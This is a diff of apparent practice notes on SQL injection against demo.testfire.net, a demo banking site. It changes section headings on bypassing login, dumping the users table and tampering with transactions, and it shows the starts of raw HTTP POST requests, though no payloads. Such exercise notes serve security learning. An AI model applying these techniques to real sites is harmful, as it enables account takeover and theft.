@@ -1,5 +1,5 @@
 ## sqli solutions 
-## Bypass Login and dump tables 
+## Bypass Login and dump tables http://demo.testfire.net/bank/login.aspx
 ```
 POST /bank/login.aspx HTTP/1.1
 Host: demo.testfire.net
@@ -44,7 +44,7 @@ Table: users
 
 
 
-### http://demo.testfire.net/bank/account.aspx
+### all your transaction belong to us http://demo.testfire.net/bank/transaction.aspx
 
 ```
 POST /bank/transaction.aspx HTTP/1.1
